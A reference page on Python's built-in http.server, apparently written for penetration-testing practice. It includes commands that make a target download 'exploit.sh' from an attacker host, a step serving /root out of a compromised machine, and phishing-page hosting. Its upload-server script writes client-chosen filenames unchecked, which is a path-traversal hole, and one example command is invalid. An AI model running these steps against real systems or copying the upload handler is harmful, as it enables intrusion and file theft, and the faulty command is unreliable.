# python HTTP Server

**Python HTTP Server** — a built-in Python module that creates a simple HTTP server for serving files over the network.

## Syntax

```bash
# Python 3
python3 -m http.server <port> [options]

# Python 2 (deprecated)
python -m SimpleHTTPServer <port>
```

## Purpose

Quickly start a lightweight HTTP server in any directory to serve files over HTTP. Extremely useful for transferring files to/from a target machine during penetration testing, sharing files within a local network, or testing web applications without a full web server setup.

## Common Parameters

| Parameter | Description |
|-----------|-------------|
| `<port>` | Port number (default 8000) |
| `--bind <addr>` | Bind to a specific IP address |
| `--directory <dir>` | Specify directory to serve (Python 3.7+) |
| `-c` / `--cgi` | Enable CGI execution (Python 3) |

## Examples

```bash
# Start server on default port 8000 in current directory
python3 -m http.server

# Start on a specific port
python3 -m http.server 8080

# Bind to all interfaces (reachable from other machines)
python3 -m http.server 0.0.0.0:80

# Serve a specific directory
python3 -m http.server --directory /home/user/share 9999

# Serve only on localhost
python3 -m http.server --bind 127.0.0.1 8000

# Run in background
python3 -m http.server 8000 &

# Upload-enabled server (custom script needed, or use uploads module)
# Simple upload can be done via:
curl -F "file=@localfile.txt" http://target:8000/

# One-liner to download a file from target
# On target:  python3 -m http.server 8000
# On attacker: wget http://target:8000/flag.txt
```

## Real-World Usage in Penetration Testing

### Transfer Files to Target

```bash
# On attacker machine (serve the file)
python3 -m http.server 8000

# On target machine (download the file)
wget http://10.10.10.5:8000/exploit.sh
# or
curl -O http://10.10.10.5:8000/exploit.sh
```

### Transfer Files from Target

```bash
# On target machine (start server with data)
cd /root && python3 -m http.server 8000

# On attacker machine (fetch data)
wget http://10.10.10.1:8000/flag.txt
```

### Host a Phishing Page (Lab Use Only)

```bash
# Serve HTML, JavaScript, and other resources
python3 -m http.server 8080 --directory /tmp/phishing
```

## Common Mistakes

- Running without binding to `0.0.0.0` — the default bind is `0.0.0.0` in Python 3, but older versions may bind to `localhost` only.
- Serving sensitive data — the entire directory tree is accessible. Never serve directories containing credentials, keys, or sensitive files in production.
- Forgetting to open the firewall — `sudo ufw allow 8000` if a firewall is active.
- Using Python 2's `SimpleHTTPServer` — Python 2 is EOL. Use `python3 -m http.server`.
- Leaving the server running — it has no authentication and no access controls.
- Not using a dedicated port — common ports like 80/443 require root; use high ports (8000, 8080, 9999).

## Advanced: Upload-Enabled Server

```python
# upload_server.py — start with: python3 upload_server.py
from http.server import HTTPServer, SimpleHTTPRequestHandler
import cgi

class UploadHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers,
                                environ={'REQUEST_METHOD': 'POST'})
        file_item = form['file']
        if file_item.filename:
            with open(file_item.filename, 'wb') as f:
                f.write(file_item.file.read())
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Upload OK')
        else:
            self.send_error(400, 'No file uploaded')

HTTPServer(('0.0.0.0', 8000), UploadHandler).serve_forever()
```

## Compatibility

| OS | Support | Notes |
|----|---------|-------|
| Linux | Full | Requires Python 3 |
| Windows | Full | Requires Python 3 |
| macOS | Full | Requires Python 3 |

```bash
# Requires Python 3
python3 --version
```
